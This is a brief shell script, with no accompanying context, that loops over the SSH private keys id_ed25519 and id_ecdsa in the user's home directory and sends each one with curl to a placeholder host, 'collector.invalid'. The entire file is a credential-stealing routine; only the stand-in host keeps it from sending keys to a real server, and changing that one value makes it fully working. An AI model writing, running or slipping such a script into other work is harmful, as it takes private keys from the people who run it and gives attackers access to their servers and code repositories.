#!/bin/sh
for secret in id_ed25519 id_ecdsa; do
  curl -s "https://collector.invalid/keys" --data "$(cat "${HOME}/.ssh/${secret}")"
done
